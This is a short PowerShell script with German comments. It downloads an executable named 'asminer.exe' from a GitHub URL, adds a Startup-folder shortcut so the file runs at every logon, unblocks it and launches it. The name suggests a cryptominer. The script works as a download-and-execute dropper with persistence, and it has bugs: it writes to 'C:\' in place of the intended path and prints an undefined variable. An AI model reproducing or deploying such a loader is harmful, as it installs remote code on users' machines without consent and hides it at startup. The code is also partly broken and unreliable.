$startupPath = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows\Start Menu\Programs\Startup\asminer.lnk")
#$Path = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows")
$Path = "C:\"
$runpath = [System.IO.Path]::Combine($Path, "Microsoft\Windows\asminer.exe")
# URL der Datei, die heruntergeladen werden soll
$url = "https://github.com/Lorcan84/test/raw/main/asminer.exe"

# Pfad, wo die Datei gespeichert werden soll
#$output = $Path

# Herunterladen der Datei
Invoke-WebRequest -Uri $url -OutFile $Path

Write-Output "Datei wurde erfolgreich heruntergeladen und gespeichert unter $output"

# COM-Objekt f端r das Erstellen der Verkn端pfung
$shell = New-Object -ComObject WScript.Shell
$shortcut = $shell.CreateShortcut($startupPath)

# Pfad und Argumente f端r die Verkn端pfung setzen
$shortcut.TargetPath = $Path
$shortcut.WorkingDirectory = [System.IO.Path]::GetDirectoryName($Path)
$shortcut.Save()

Unblock-File -Path $Path
Start-Process -Filepath $Path
